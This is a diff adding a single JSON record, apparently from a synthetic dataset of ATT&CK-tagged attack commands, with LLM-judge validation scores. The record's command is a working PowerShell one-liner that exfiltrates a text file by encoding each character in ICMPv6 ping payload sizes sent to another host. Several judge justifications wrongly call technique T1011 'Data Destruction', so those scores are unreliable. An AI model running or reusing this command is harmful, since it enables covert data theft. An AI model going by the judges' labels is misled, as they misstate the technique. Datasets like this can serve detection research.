@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fe80::a%11'; $s=Get-Content -Path 'C:\\Users\\Public\\message.txt' -Raw; $s.ToCharArray() | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (700 + [byte][char]$_) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Exfiltrates plaintext characters by mapping each char code into ICMPv6 payload size using Test-Connection, leveraging ICMPv6 as the exfil medium per T1011.",
+  "rationale_steps": [
+    "Read the text into memory.",
+    "For each character, convert to its byte value and offset it.",
+    "Send ICMPv6 echoes with payload sizes the receiver can decode."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-31058b99",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable declarations, balanced quotes and parentheses, valid cmdlet names and parameters, and correct pipeline operations.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data via network protocols (using ICMPv6 packet sizes), it implements exfiltration over alternative protocol (T1048) rather than the claimed Data Destruction (T1011) technique.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:07:23.646817Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed, uses valid cmdlets, parameters, variable assignments, and flow control with balanced syntax.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration using ICMPv6, which is fundamentally misaligned with the T1011 MITRE ATT&CK technique for Data Destruction.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:07:35.624606Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid PowerShell with balanced quoting, correct parameters (-ComputerName, -Count, -BufferSize, -IPv6, -Quiet), and proper pipeline and expressions.",
+        "semantic_score": 4,
+        "semantic_justification": "Operationally plausible ICMPv6 exfiltration by encoding characters into payload sizes, but it mismaps the MITRE technique (data destruction vs. exfiltration) and relies on IPv6 link-local reachability and byte casting assumptions.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:08:18.302631Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
